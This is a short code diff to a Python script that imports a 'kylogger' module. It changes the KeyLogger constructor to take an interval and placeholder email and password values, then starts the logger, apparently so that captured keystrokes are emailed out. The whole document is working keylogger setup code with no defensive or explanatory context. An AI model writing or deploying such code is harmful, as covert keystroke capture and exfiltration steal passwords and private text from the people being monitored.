@@ -1,4 +1,4 @@
 import kylogger
 
-logger = kylogger.KeyLogger()
+logger = kylogger.KeyLogger(5,"email","pass")
 logger.start()
